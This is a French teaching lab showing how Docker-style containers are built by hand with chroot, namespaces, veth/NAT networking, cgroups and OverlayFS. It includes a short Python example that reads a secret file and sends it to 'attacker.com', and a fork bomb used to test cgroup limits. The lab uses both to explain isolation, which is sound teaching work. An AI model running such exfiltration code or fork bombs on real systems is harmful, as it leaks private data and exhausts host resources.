# Labo Docker

Bien que Docker ne soit pas à proprement parler un chapitre de la programmation concurrente, de nombreux problèmes de concurrence sont aujourd'hui résolus en utilisant des conteneurs avec des services isolés.

Dans ce travail pratique nous allons explorer les fondements de Docker, comment il fonctionne sous le capot, puis comment utiliser Docker pour créer des conteneurs et les faire communiquer entre eux.

## Objectifs

À la fin de ce TP, vous serez capables de :

- Expliquer ce qu'est un conteneur et en quoi il diffère d'un processus et d'une machine virtuelle
- Décrire les mécanismes du noyau Linux qui rendent la conteneurisation possible : `chroot`, namespaces, cgroups et OverlayFS
- Créer manuellement un environnement isolé (système de fichiers, processus, réseau) sans Docker
- Comprendre ce que Docker fait "sous le capot" quand il lance un conteneur

## Docker c'est quoi ?

Docker est une plateforme apparue en 2013 qui permet de créer, déployer et gérer des applications dans des conteneurs.

Un conteneur est une unité légère et portable qui contient tout ce dont une application a besoin pour fonctionner : le code, les bibliothèques, les dépendances et les configurations.

Contrairement à un processus qui n'est qu'un exécutable avec une mémoire isolée, un conteneur est un environnement d'exécution complet qui peut être facilement déplacé entre différents systèmes. Un conteneur se comporte comme un vrai système d'exploitation, mais il partage le noyau de l'hôte avec d'autres conteneurs, ce qui le rend plus léger que les machines virtuelles traditionnelles.

Docker offre en plus une grande flexibilité de gestion et de création d'images. Les images Docker sont construites à partir de fichiers de configuration appelés Dockerfiles, qui définissent les étapes nécessaires pour créer une image à partir d'une image de base.

Tout développeur utilise Docker au quotidien pour créer des environnements de développement, tester des applications dans des environnements isolés, et déployer des applications en production.

!!! question

    1. Quelle est la différence entre un conteneur et un simple processus Linux ?
    2. Pourquoi dit-on qu'un conteneur est plus léger qu'une machine virtuelle ?
    3. Donnez un exemple concret où l'isolation offerte par Docker est utile en développement.

## Isoler, le maître mot de la conteneurisation

Dans tout logiciel, les questions de sécurité — protéger les données, éviter les conflits entre applications — sont primordiales. On distingue plusieurs niveaux d'isolation :

- **Isolation mémoire** : un processus ne peut pas accéder à la mémoire d'un autre (natif du système d'exploitation).
- **Isolation de processus** : les processus ne peuvent pas interférer directement les uns avec les autres, même via des signaux ou de la mémoire partagée.
- **Isolation réseau** : un processus ne peut pas communiquer librement sur internet ou avec d'autres processus, à moins que cela ne soit explicitement autorisé.
- **Isolation du système de fichiers** : un processus ne peut pas accéder au système de fichiers de l'hôte ou d'autres processus, sauf autorisation explicite.
- **Isolation des ressources** : un processus ne peut pas monopoliser le CPU, la mémoire ou les disques sans limitation.
- **Isolation de l'environnement d'exécution** : un processus n'a pas accès aux variables d'environnement ou fichiers de configuration d'un autre.
- **Isolation utilisateur** : un processus ne peut pas accéder aux ressources d'un autre utilisateur, sauf autorisation explicite.

> [!NOTE]
> **Questions de réflexion**
>
> - Un processus Linux classique bénéficie-t-il déjà de certains de ces niveaux d'isolation ? Lesquels ?
> - Quels niveaux d'isolation manquent à un simple `chroot` ?
> - Pourquoi l'isolation réseau est-elle particulièrement importante pour un service web ?

## Créer un conteneur à la main

### Prérequis

Ce tutorial est prévu pour être réalisé sur WSL2 avec Ubuntu, mais il peut être réalisé sur n'importe quelle distribution Linux dont le noyau supporte les fonctionnalités nécessaires à la conteneurisation (`cgroups` et `namespaces`).

### Installation des outils nécessaires

```bash
sudo apt update
sudo apt install -y debootstrap util-linux iproute2 iputils-ping procps mount
```

debootstrap
: Crée un système de fichiers minimal pour une distribution Linux en téléchargeant les paquets depuis un dépôt.

util-linux
: Collection d'outils système de base (`unshare`, `lsns`, gestion des partitions…).

iproute2
: Suite d'outils de gestion du réseau (`ip`, `ss`…).

iputils-ping
: Outils de test de connectivité réseau (`ping`, `traceroute`…).

procps
: Outils de surveillance des processus (`ps`, `top`, `pgrep`…).

mount
: Monte et démonte des systèmes de fichiers.

### Créer un système de fichiers pour le conteneur

Définissons deux variables pour stocker le chemin du système de fichiers et le nom de la distribution courante :

```bash
ROOTFS=$HOME/mycontainer-rootfs
CODENAME=$(. /etc/os-release && echo "$VERSION_CODENAME")
```

Le fichier `/etc/os-release` contient les informations sur la distribution en cours. Chez moi :

```bash
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.3 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
```

On crée le dossier puis on demande à `debootstrap` de construire un système de fichiers minimal :

```bash
sudo mkdir -p "$ROOTFS"
sudo debootstrap --variant=minbase "$CODENAME" "$ROOTFS" http://archive.ubuntu.com/ubuntu/
```

`debootstrap` se connecte au dépôt Ubuntu, télécharge les paquets nécessaires et vérifie leur signature GPG pour éviter les attaques de type *man-in-the-middle* :

```text
I: Retrieving InRelease
I: Checking Release signature
I: Valid Release signature (key id F6ECB3762474EDA9D21B7022871920D1991BC93C)
I: Retrieving Packages
I: Validating Packages
I: Resolving dependencies of required packages...
...
I: Base system installed successfully.
```

Vous pouvez ensuite explorer le système de fichiers du conteneur :

```bash
$ ls $ROOTFS
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

$ ls -al $ROOTFS/usr/bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /home/ycr/mycontainer-rootfs/usr/bin/bash
```

On retrouve les applications de base comme `bash` et tous les dossiers standards d'un système Linux. Les fichiers dans `/dev` sont pour l'instant des liens symboliques vers le système de fichiers de l'hôte.

### Chrooter dans le conteneur

La commande `chroot` change le répertoire racine d'un processus et de ses enfants. Sans cette protection, un programme malveillant peut lire des fichiers sensibles en utilisant des chemins absolus :

```python
secret = open('/home/boss/secret.txt', 'r').read()
request.get('http://attacker.com/leak?data=' + secret)
```

Avec `chroot`, le processus est confiné dans le système de fichiers du conteneur et ne peut plus accéder aux fichiers de l'hôte via des chemins absolus.

Chrootez dans le conteneur et ouvrez un shell :

```bash
sudo chroot "$ROOTFS" /bin/bash
```

Essayez d'accéder à vos données personnelles depuis le conteneur :

```bash
$ ls /home
```

Vous ne verrez rien : le processus est isolé dans le système de fichiers que nous avons créé. Utilisez `exit` pour revenir à votre shell normal.

> [!NOTE]
> **Questions de réflexion**
>
> - `chroot` isole-t-il les processus ? Depuis le conteneur, pouvez-vous voir les processus de l'hôte avec `ps -ax` ?
> - `chroot` isole-t-il le réseau ? Pouvez-vous pinguer une adresse externe ?
> - Que manque-t-il à `chroot` seul pour avoir un vrai conteneur ?

### Installer des applications dans le conteneur

Pour la suite on veut pouvoir accéder à `ping` et `ip` depuis le conteneur. On monte temporairement les systèmes de fichiers spéciaux de l'hôte pour permettre l'installation via `apt` :

```bash
sudo mount --bind /dev  "$ROOTFS/dev"
sudo mount --bind /sys  "$ROOTFS/sys"
sudo mount -t proc proc "$ROOTFS/proc"

sudo chroot "$ROOTFS" /bin/bash -c "apt update && apt install -y iputils-ping procps python3"

sudo umount "$ROOTFS/proc"
sudo umount "$ROOTFS/sys"
sudo umount "$ROOTFS/dev"
```

Notez qu'avec ceci nous n'avons que l'isolation du système de fichiers, mais pas l'isolation des processus, du réseau, etc. Nous allons voir comment ajouter ces autres niveaux d'isolation dans la suite du TP.

### Unshare

Sous Linux, un espace de noms (`namespace`) est une fonctionnalité du noyau qui permet d'isoler les ressources système pour un groupe de processus. La commande `unshare` crée de nouveaux espaces de noms pour un processus, lui permettant d'être isolé du reste du système :

```bash
sudo unshare \
  --fork \
  --pid \
  --mount \
  --uts \
  --ipc \
  --net \
  --cgroup \
  --mount-proc \
  chroot "$ROOTFS" /bin/bash
```

| Option | Description |
| --- | --- |
| `--fork` | Fork le processus après avoir créé les espaces de noms. |
| `--pid` | Isole les processus du conteneur de ceux de l'hôte. |
| `--mount` | Isole le système de fichiers du conteneur. |
| `--uts` | Permet au conteneur d'avoir son propre nom d'hôte. |
| `--ipc` | Isole les communications inter-processus. |
| `--net` | Isole le réseau du conteneur. |
| `--cgroup` | Permet de limiter les ressources du conteneur. |
| `--mount-proc` | Monte le système de fichiers `proc` dans le conteneur. |

Notez que sous WSL2, `--mount-proc` ne fonctionne pas toujours. On peut alors monter manuellement `/proc` depuis le conteneur :

```bash
mount -t proc proc /proc
```

On peut vérifier le degré d'isolation. Depuis le conteneur, on ne voit que ses propres processus :

```bash
root@nb-8355:/# ps -ax
    PID TTY      STAT   TIME COMMAND
      1 ?        S      0:00 /bin/bash
     11 ?        R+     0:00 ps -ax
```

L'accès réseau est également isolé :

```bash
root@nb-8355:/# ip a
1: lo: <LOOPBACK> mtu 65536 qdisc noop state DOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
```

Pour sortir du conteneur, utilisez `exit`.

> [!NOTE]
> **Questions de réflexion**
>
> - Que se passe-t-il si vous omettez `--pid` dans la commande `unshare` ? Pouvez-vous voir les processus de l'hôte ?
> - À quoi sert `--uts` concrètement ? Essayez de changer le hostname depuis le conteneur (`hostname monconteneur`) et vérifiez que l'hôte n'est pas affecté.
> - Quelle option de `unshare` correspond à l'isolation réseau que vous observez avec `ip a` ?

### Établir le réseau dans le conteneur

Sans réseau, le conteneur ne peut communiquer avec personne. On va créer une interface virtuelle pour le relier à l'hôte, puis à internet :

```text
[ conteneur veth1 ] <---> [ veth0 host ] ---> (NAT) ---> eth0 ---> Internet
```

On crée une paire d'interfaces virtuelles — comme deux extrémités d'un câble réseau virtuel :

```bash
sudo ip link add veth0 type veth peer name veth1
```

```text
[veth0] <--- câble virtuel ---> [veth1]
```

Pour connecter `veth1` au namespace réseau du conteneur, on a besoin du PID du processus `bash` **vu depuis l'hôte**. Depuis un autre terminal :

```bash
$ pstree -p $(pgrep -f "chroot $ROOTFS" | head -1)
sudo(123921)───sudo(123922)───unshare(123923)───bash(123924)
```

Dans cet exemple, le PID hôte du bash dans le conteneur est `123924`. Depuis le conteneur, ce même processus est vu comme le PID `1`. Stockez ce PID hôte :

```bash
CONTPID=123924   # remplacez par votre PID
```

Connectez `veth1` au namespace réseau du conteneur :

```bash
sudo ip link set veth1 netns "$CONTPID"
```

Activez les interfaces et configurez les adresses IP :

```bash
# Sur l'hôte
sudo ip link set veth0 up
sudo ip addr add 10.200.1.1/24 dev veth0

# Dans le conteneur
ip link set veth1 up
ip addr add 10.200.1.2/24 dev veth1
```

Testez la connectivité entre le conteneur et l'hôte (depuis le conteneur) :

```bash
$ ping -c 3 10.200.1.1
PING 10.200.1.1 (10.200.1.1) 56(84) bytes of data.
64 bytes from 10.200.1.1: icmp_seq=1 ttl=64 time=0.135 ms
64 bytes from 10.200.1.1: icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from 10.200.1.1: icmp_seq=3 ttl=64 time=0.061 ms
```

Internet n'est pas encore accessible :

```bash
$ ping -c 3 8.8.8.8
ping: connect: Network is unreachable
```

Il faut ajouter une route par défaut dans le conteneur, activer le forwarding IP sur l'hôte, puis configurer le NAT :

```bash
# Dans le conteneur
ip route add default via 10.200.1.1
```

```bash
# Sur l'hôte
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -s 10.200.1.0/24 -o eth0 -j MASQUERADE
```

Le masquerading fonctionne comme un standard téléphonique d'entreprise : le conteneur a une adresse IP "interne" (`10.200.1.2`), invisible depuis internet. Le NAT remplace cette adresse source par l'adresse publique de l'hôte dans chaque paquet sortant, et fait le chemin inverse pour les réponses — exactement comme un employé dont le numéro de poste interne `1234` est remplacé par le numéro public de l'entreprise quand il appelle à l'extérieur.

Dans Docker, plutôt que de gérer ce NAT pour chaque conteneur individuellement, on crée un pont réseau (`docker0`) auquel tous les conteneurs se connectent, et on configure le masquerading une seule fois sur ce pont.

> [!NOTE]
> **Questions de réflexion**
>
> - Pourquoi a-t-on besoin du PID **hôte** du bash et non du PID `1` vu depuis le conteneur ?
> - Que fait exactement `--net` dans `unshare` ? Pourquoi le conteneur n'a-t-il que l'interface `lo` après `unshare` ?
> - À quoi sert la règle `MASQUERADE` ? Que se passerait-il sans elle ?

## Cgroups

Les `cgroups` (control groups) sont une fonctionnalité du noyau Linux qui permet de limiter les ressources système d'un groupe de processus. Ils permettent par exemple de plafonner l'utilisation CPU d'un conteneur à 50%, ou de limiter sa mémoire à 256 Mo. Sans cgroups, un conteneur mal configuré pourrait monopoliser toutes les ressources de l'hôte et impacter les autres.

Sous WSL2 avec Ubuntu 24.04, les `cgroups` v2 sont supportés nativement :

```bash
$ mount | grep cgroup
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)
```

On crée un groupe de contrôle et on active les contrôleurs souhaités :

```bash
CG=/sys/fs/cgroup/demo-ctr
sudo mkdir -p "$CG"
echo "+cpu +memory +io +pids" | sudo tee /sys/fs/cgroup/cgroup.subtree_control
```

Puis on configure les limites :

```bash
# CPU : 12ms de CPU toutes les 100ms, soit ~12% d'un cœur
echo "12000 100000" | sudo tee "$CG/cpu.max"

# Mémoire : 256 Mo maximum
echo "256M" | sudo tee "$CG/memory.max"

# PIDs : 42 processus maximum
echo 42 | sudo tee "$CG/pids.max"
```

On attache le processus du conteneur à ce groupe :

```bash
echo "$CONTPID" | sudo tee "$CG/cgroup.procs"
```

Il est temps de tester depuis votre conteneur :

```bash
[container]# :(){ :|:& };:     # fork bomb — sera arrêtée à 42 processus
[container]# stress --vm 1 --vm-bytes 512M   # OOM killed
[container]# stress --cpu 4    # throttlé à ~12% d'un cœur
```

> [!NOTE]
> **Questions de réflexion**
>
> - Que se passe-t-il exactement lors d'un OOM kill ? Qui tue le processus ?
> - La fork bomb est-elle arrêtée grâce aux cgroups ou aux namespaces ?
> - Sans limite de PIDs, qu'est-ce qu'une fork bomb pourrait faire à l'hôte entier ?

## Overlayfs

Docker utilise OverlayFS pour permettre à chaque conteneur d'avoir un système de fichiers isolé tout en partageant les fichiers de base avec d'autres conteneurs. Cela évite de dupliquer des gigaoctets de fichiers communs.

Créons un exemple simple :

```bash
mkdir -p overlay-demo/{lower,upper,work,merged}
```

lower
: Système de fichiers de base, en lecture seule. Correspond à l'image Docker.

upper
: Modifications spécifiques au conteneur. Tout ce qui est modifié ici ne touche pas `lower`.

merged
: Vue combinée de `lower` et `upper`. C'est ce que voit le conteneur.

work
: Dossier interne utilisé par OverlayFS pour gérer les modifications (ne pas y toucher).

On crée un fichier de base dans `lower` :

```bash
echo "Hello Bob" > overlay-demo/lower/hello.txt
```

On monte le système de fichiers en overlay :

```bash
sudo mount -t overlay overlay \
    -o lowerdir=overlay-demo/lower,upperdir=overlay-demo/upper,workdir=overlay-demo/work \
    overlay-demo/merged
```

`merged` contient maintenant `hello.txt`, hérité de `lower`. Modifions-le :

```bash
echo "Hello Alice" > overlay-demo/merged/hello.txt
```

La modification n'est pas dans `lower` (intouché) mais dans `upper` :

```text
overlay-demo
├── lower
│   └── hello.txt    ← "Hello Bob"   (inchangé)
├── merged
│   └── hello.txt    ← "Hello Alice" (vue combinée)
├── upper
│   └── hello.txt    ← "Hello Alice" (la modification)
└── work
    └── work
```

Observez le contenu des fichiers dans chaque dossier pour bien visualiser ce mécanisme de copy-on-write.

OverlayFS supporte également plusieurs couches `lower` (`-o lowerdir=layer3:layer2:layer1`), ce qui permet de représenter les couches d'une image Docker — chaque instruction `RUN` dans un Dockerfile crée une nouvelle couche.

> [!NOTE]
> **Questions de réflexion**
>
> - Que se passe-t-il si vous supprimez un fichier dans `merged` ? Est-il supprimé dans `lower` ?
> - Comment Docker exploite-t-il ce mécanisme pour que deux conteneurs basés sur la même image partagent leurs fichiers de base ?
> - Que représentent `lower` et `upper` dans le cycle de vie d'un conteneur Docker ?

## Machines virtuelles vs Conteneurs

Maintenant que vous avez construit un conteneur à la main, voici comment il se compare à une machine virtuelle :

| Critère | Machine Virtuelle | Conteneur |
| ------- | :---------------: | :-------: |
| Noyau | Propre noyau invité | Partagé avec l'hôte |
| Démarrage | Quelques minutes | Quelques secondes |
| Taille typique | Plusieurs Go | Quelques dizaines de Mo |
| Isolation | Forte (niveau matériel) | Moyenne (namespaces noyau) |
| Overhead CPU/mémoire | Élevé (hyperviseur) | Faible |
| Portabilité | Dépend de l'hyperviseur | Standard Docker/OCI |
| Cas d'usage typique | Isolation forte, OS différents | Microservices, déploiement rapide |

La différence fondamentale : une VM émule un ordinateur complet avec son propre noyau, tandis qu'un conteneur partage le noyau de l'hôte et n'isole que les ressources via les mécanismes que vous venez de pratiquer (`namespaces`, `cgroups`, `overlayfs`).

> [!NOTE]
> **Questions de réflexion**
>
> - Dans quel cas préféreriez-vous une VM plutôt qu'un conteneur ?
> - Est-il possible de faire tourner un conteneur Windows sur un hôte Linux ? Pourquoi ?

## Nettoyage

La partie expérimentale de ce TP est maintenant terminée. Nettoyons les ressources créées :

```bash
# Démontage du conteneur
sudo umount "$ROOTFS/proc" 2>/dev/null
sudo umount "$ROOTFS/sys"  2>/dev/null
sudo umount "$ROOTFS/dev"  2>/dev/null
sudo rm -rf "$ROOTFS"

# Suppression des interfaces réseau (supprime veth0 et veth1 d'un coup)
sudo ip link delete veth0 2>/dev/null

# Suppression de la règle NAT
sudo iptables -t nat -D POSTROUTING -s 10.200.1.0/24 -o eth0 -j MASQUERADE 2>/dev/null

# Désactivation du forwarding IP (se réinitialise au redémarrage de toute façon)
sudo sysctl -w net.ipv4.ip_forward=0

# Démontage de l'overlay
sudo umount overlay-demo/merged 2>/dev/null
rm -rf overlay-demo
```

## Conclusion

Dans ce travail pratique, nous avons construit un conteneur à la main en utilisant les quatre briques fondamentales du noyau Linux :

1. **chroot** — isole le système de fichiers du conteneur.
2. **Namespaces** (`unshare`) — isolent les processus, le réseau, le hostname et les IPC.
3. **Cgroups** — limitent les ressources consommées (CPU, mémoire, PIDs).
4. **OverlayFS** — partage les fichiers de base entre conteneurs avec copy-on-write.
5. **Configuration réseau** (`veth`, NAT) — connecte le conteneur à internet tout en l'isolant.

Ces mécanismes sont exactement ce que Docker orchestre automatiquement lorsqu'il lance un conteneur. La différence : Docker ajoute une couche d'abstraction (images, registres, `docker-compose`) qui rend tout cela accessible sans manipuler le noyau directement.
